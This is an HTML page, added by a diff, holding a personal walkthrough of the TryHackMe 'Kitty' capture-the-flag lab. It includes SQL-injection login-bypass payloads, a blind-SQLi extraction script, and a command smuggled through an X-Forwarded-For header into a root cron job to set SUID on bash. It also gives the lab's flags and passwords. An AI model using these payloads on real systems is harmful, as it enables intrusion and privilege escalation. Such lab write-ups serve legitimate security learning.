@@ -1,0 +1,147 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Kitty // writeup</title>
+    <meta name="description" content="Web enumeration, credential discovery and the privilege-escalation chain to root on the Kitty box.">
+    <meta name="theme-color" content="#0a0506">
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@300;400;500;700&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <link rel="stylesheet" href="../style.css">
+    <script>
+        (function () {
+            try {
+                if (localStorage.getItem('theme') === 'light') {
+                    document.documentElement.setAttribute('data-theme', 'light');
+                }
+            } catch (e) { }
+        })();
+    </script>
+</head>
+
+<body class="writeup-page">
+    <div class="scanlines" aria-hidden="true"></div>
+    <div class="scroll-progress" id="scrollProgress"></div>
+
+    <header class="writeup-topbar">
+        <a class="prompt-link" href="../writeups.html">
+            <span class="prompt-user">sameekey@portfolio</span><span class="prompt-sep">:</span><span class="prompt-path">~/writeups</span><span class="prompt-sym">$</span>
+            <span class="prompt-cmd">cd .. [Archive Portal]</span>
+        </a>
+        <div class="topbar-actions">
+            <a class="card-link small github" href="https://github.com/Samik-Parajuli/tryhackme_walkthroughs" target="_blank" rel="noopener"><i class="fab fa-github"></i> GitHub Repo</a>
+            <a class="card-link small" href="../index.html" style="margin-right: 0.5rem;"><i class="fas fa-terminal"></i> Main Dossier</a>
+            <span class="kbd-hint"><kbd>T</kbd> theme</span>
+            <button class="theme-toggle" id="themeToggle" type="button">
+                <i class="fas fa-moon"></i><span>Theme</span>
+            </button>
+        </div>
+    </header>
+
+    <main class="writeup-shell">
+        <article class="writeup-article">
+            <div class="writeup-head">
+                <p class="writeup-kicker">// verified laboratory walkthrough</p>
+                <h1>Kitty</h1>
+                <div class="writeup-meta">
+                    <span class="badge">TryHackMe</span>
+      <span class="badge ghost">Web / Linux</span>
+      <span class="badge diff-medium">Medium</span>
+      <span class="meta-item"><i class="fas fa-calendar"></i> 2026-08-03</span>
+      <span class="meta-item"><i class="fas fa-tags"></i> TryHackMe / Web / Linux / Medium</span>
+      <span class="meta-item"><i class="fas fa-file-code"></i> tryhackme-kitty-walkthrough.md</span>
+                </div>
+                <p class="writeup-summary">Web enumeration, credential discovery and the privilege-escalation chain to root on the Kitty box.</p>
+                <div class="writeup-actions">
+                    <a class="card-link github" href="https://github.com/Samik-Parajuli/tryhackme_walkthroughs/blob/main/tryhackme-kitty-walkthrough.pdf" target="_blank" rel="noopener"><i class="fab fa-github"></i> Open on GitHub</a>
+                    <a class="card-link" href="tryhackme-kitty-walkthrough.pdf" download><i class="fas fa-file-pdf"></i> Download Verified PDF</a>
+                    <a class="card-link primary" href="../writeups.html"><i class="fas fa-scroll"></i> Writeups Portal</a>
+                    <a class="card-link" href="../index.html#writeups"><i class="fas fa-arrow-left"></i> Main Dossier</a>
+                </div>
+            </div>
+            <div class="writeup-body">
+                <h1>Walkthrough</h1>
+<p>Category: Web / SQL Injection · Target: 10.49.171.215 · User flag + Root flag</p>
+<h2>Flags</h2>
+<p>Flag Value User flag THM{31e606998972c3c6baae67bab463b16a} (/home/kitty/user.txt) Root flag THM{581bfc26b53f2e167a05613eecf039bb} (/root/root.txt)</p>
+<h2>1. Port Scan</h2>
+<p>PORT   STATE SERVICE VERSION 22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 80/tcp open  http    Apache httpd 2.4.41 (Ubuntu) Only SSH and an Apache PHP web server. The web app is our attack surface.</p>
+<h2>2. Web App Reconnaissance</h2>
+<p>The site is a simple login page (/index.php) with a registration page (/register.php). Registering a normal account and logging in lands on /welcome.php, which is empty — no other functionality. robots.txt does not exist. Directory fuzzing only surfaced config.php (blank when browsed). The only real attack surface is the login query.</p>
+<h2>3. SQL Injection Login Bypass</h2>
+<p>The login query is vulnerable. Sending a comment payload as the username bypasses authentication completely: username = Kitty&#39; -- - password = whatever SELECT * FROM siteusers WHERE username = &#39;Kitty&#39; -- -&#39; AND password = &#39;whatever&#39; ^^^^^^^^^^^^^^^^^^^^^ ^^^^^^^^^^^^^^^^^^^^^^^^^^^^ TRUE                   commented out → 302 redirect to /welcome.php (logged in as Kitty) The login success (302 →welcome.php) vs failure (Invalid username or password) forms a boolean oracle — exactly what we need for blind SQLi.</p>
+<h2>4. Blind SQL Injection — Dumping Kitty’s Password</h2>
+<p>There is a WAF-ish filter in index.php that blocks sleep, 0x, /**/, ifnull, or , and -- &lt;4 alnum chars&gt;. It is weak enough to bypass the login but breaks tools like SQLMap (it flags the finding as a false positive). So the password dump must be done by hand / scripted. The oracle payload pattern used: Kitty&#39; AND SUBSTRING((SELECT BINARY password FROM siteusers WHERE username = &#39;Kitty&#39;), &lt;pos&gt;, 1) = &#39;&lt;char&gt;&#39; -- -</p>
+<p>If the condition is TRUE, we get a 302 (login success); otherwise 200 with an error. A Python script walks every position and character: import requests, string CHARS = string.ascii_letters + string.digits + &#39;._@!$%^&amp;*-+=;:,?/~#&lt;&gt;|` &#39; def oracle(cond): u = &quot;Kitty&#39; AND %s -- -&quot; % cond r = requests.post(BASE, data={&#39;username&#39;: u, &#39;password&#39;: &#39;x&#39;*20}, allow_redirects=False) return r.status_code == 302 and &#39;welcome.php&#39; in r.headers.get(&#39;Location&#39;,&#39;&#39;) # db name dump(&#39;SELECT database()&#39;)                          -&gt; mywebsite # table name (LIKE-based) EXISTS (SELECT 1 FROM information_schema.tables WHERE table_schema = database() AND BINARY table_name LIKE &#39;&lt;so_far&gt;%&#39;)      -&gt; siteusers # Kitty&#39;s password</p>
+<p>dump(&quot;SELECT BINARY password FROM siteusers WHERE username = &#39;Kitty&#39;&quot;) -&gt; L0ng_Liv3_KittY Two MySQL quirks to watch: SUBSTRING() past the end of a string compares as &#39;&#39; = &#39; &#39; (trailing-space padding) — fixed by checking LENGTH(...) = pos to stop; and % / _ are LIKE wildcards, so they must be excluded from LIKE-based dumping.</p>
+<h2>5. SSH Foothold → User Flag</h2>
+<pre class="code-block" data-lang="bash"><code>$ ssh kitty@10.49.171.215        # password: L0ng_Liv3_KittY
+kitty@ubuntu:~$ id</code></pre>
+<p>uid=1000(kitty) gid=1000(kitty) groups=1000(kitty)</p>
+<pre class="code-block" data-lang="bash"><code>kitty@ubuntu:~$ cat user.txt</code></pre>
+<h2>6. Local Enumeration — A Second Website</h2>
+<p>Reading /var/www/html/config.php leaks MySQL credentials: define(&#39;DB_USERNAME&#39;, &#39;kitty&#39;); define(&#39;DB_PASSWORD&#39;, &#39;Sup3rAwesOm3Cat!&#39;); define(&#39;DB_NAME&#39;,     &#39;mywebsite&#39;); /var/www contains a second, nearly identical site in development/ (with a logged file owned by www-data). Its config.php points at a database named devsite.</p>
+<p>Netstat shows the development site is served on internal port 8080 — not externally reachable. An SSH tunnel exposes it locally:</p>
+<pre class="code-block" data-lang="bash"><code>$ ssh -L 8081:127.0.0.1:8080 kitty@10.49.171.215
+$ curl -s http://127.0.0.1:8081/          -&gt; 200 (devsite login)</code></pre>
+<h2>7. Root via Cron + X-Forwarded-For Command Injection</h2>
+<p>No crons appear in /etc/crontab, but /opt/log_checker.sh exists — and it is executed as root every minute by a crontab entry: #!/bin/sh while read ip; do /usr/bin/sh -c &quot;echo $ip &gt;&gt; /root/logged&quot;;     # $ip is UNQUOTED -&gt; injection done &lt; /var/www/development/logged cat /dev/null &gt; /var/www/development/logged Since $ip is not quoted, anything written into the logged file with a ; gets executed as root. The file is owned by root and not writable by us — but the development site’s index.php writes the X-Forwarded-For header into it whenever an “evil word” is detected:</p>
+<pre class="code-block" data-lang="bash"><code>$evilwords = [&quot;/sleep/i&quot;, &quot;/0x/i&quot;, &quot;/\*\*/&quot;, &quot;/-- [a-z0-9]{4}/i&quot;,</code></pre>
+<p>&quot;/ifnull/i&quot;, &quot;/ or /i&quot;]; foreach ($evilwords as $evilword) { if (preg_match($evilword, $username)) {</p>
+<pre class="code-block" data-lang="bash"><code>        $ip = $_SERVER[&#39;HTTP_X_FORWARDED_FOR&#39;];          # our header!</code></pre>
+<p>file_put_contents(&quot;/var/www/development/logged&quot;, $ip); die(); } } Sending a request that trips the filter with a malicious X-Forwarded-For: POST /index.php HTTP/1.1 Host: 127.0.0.1:8081 X-Forwarded-For: 127.0.0.1; chmod +s /usr/bin/bash Content-Type: application/x-www-form-urlencoded username=admin or 1&amp;password=x → &quot;SQL Injection detected. This incident will be logged!&quot;</p>
+<pre class="code-block" data-lang="bash"><code>$ cat /var/www/development/logged</code></pre>
+<p>127.0.0.1; chmod +s /usr/bin/bash Within a minute, the root cron executes sh -c &quot;echo 127.0.0.1; chmod +s /usr/bin/bash &gt;&gt; /root/logged&quot; — placing the SUID bit on bash:</p>
+<pre class="code-block" data-lang="bash"><code>$ ls -la /usr/bin/bash</code></pre>
+<p>-rwsr-sr-x 1 root root 1183448 ... /usr/bin/bash     # SUID now set!</p>
+<h2>8. Root Shell &amp; Root Flag</h2>
+<pre class="code-block" data-lang="bash"><code>kitty@ubuntu:~$ /usr/bin/bash -p -c &quot;id&quot;</code></pre>
+<p>uid=1000(kitty) gid=1000(kitty) euid=0(root) egid=0(root) groups=0(root)</p>
+<pre class="code-block" data-lang="bash"><code>kitty@ubuntu:~$ /usr/bin/bash -p -c &quot;cat /root/root.txt&quot;</code></pre>
+<h2>9. Attack Chain Summary</h2>
+<h1>Step Result Authenticated as 1 SQLi login bypass (Kitty&#39; -- -) Kitty Scripted blind SQLi (boolean Password 2 oracle on login redirect) L0ng_Liv3_KittY 3 SSH as kitty User flag 4 config.php + internal devsite Find the logged file</h1>
+<p>on 8080 (SSH tunnel) &amp; cron script X-Forwarded-For injection Payload lands in 5 through the evil-word filter logged Root cron executes unquoted 6 SUID bash</p>
+<pre class="code-block" data-lang="bash"><code>$ip</code></pre>
+<p>7 Root flag bash -p</p>
+<h2>10. Key Takeaways</h2>
+<p>Blind SQLi with a boolean oracle can be fully scripted — SQLMap is not • always the answer, and filters can defeat it while manual payloads work. An unquoted shell variable inside a root cron script is a classic • command-injection pivot. HTTP headers (X-Forwarded-For) must never be trusted or logged without • sanitisation. Always enumerate internal services and cron jobs (ss -tlnp, pspy) after • gaining a foothold.</p>
+            </div>
+            <div class="writeup-foot">
+                <a class="card-link primary" href="../writeups.html"><i class="fas fa-scroll"></i> Full Writeups Portal</a>
+                <a class="card-link" href="../index.html#writeups"><i class="fas fa-arrow-left"></i> Main Dossier</a>
+                <a class="card-link github" href="https://github.com/Samik-Parajuli/tryhackme_walkthroughs/blob/main/tryhackme-kitty-walkthrough.pdf" target="_blank" rel="noopener"><i class="fab fa-github"></i> Open on GitHub</a>
+                <a class="card-link" href="tryhackme-kitty-walkthrough.pdf" download><i class="fas fa-file-pdf"></i> Download Verified PDF</a>
+                <a class="card-link" href="mailto:parajulisameek@gmail.com"><i class="fas fa-envelope"></i> report a typo</a>
+            </div>
+        </article>
+    </main>
+
+    <footer class="site-footer">
+        <p class="footer-cmd">
+            <span class="prompt-user">sameekey@portfolio</span><span class="prompt-sep">:</span><span class="prompt-path">~</span><span class="prompt-sym">$</span>
+            echo "Defense is good. Offense is mandatory."
+        </p>
+        <p class="footer-muted">&copy; <span id="year"></span> Sameek Parajuli &middot; <a href="https://github.com/Samik-Parajuli/tryhackme_walkthroughs" target="_blank" rel="noopener">GitHub /tryhackme_walkthroughs</a></p>
+    </footer>
+
+    <!-- Image Lightbox Modal -->
+    <div class="lightbox-modal" id="lightboxModal" hidden>
+        <div class="lightbox-backdrop"></div>
+        <div class="lightbox-content">
+            <img src="" id="lightboxImg" alt="Enlarged view">
+            <button class="lightbox-close" id="lightboxClose" type="button">&times;</button>
+        </div>
+    </div>
+
+    <div class="scroll-to-top" id="scrollToTop" role="button" tabindex="0" aria-label="Scroll to top">
+        <i class="fas fa-arrow-up"></i>
+    </div>
+
+    <script src="../script.js"></script>
+</body>
+
+</html>
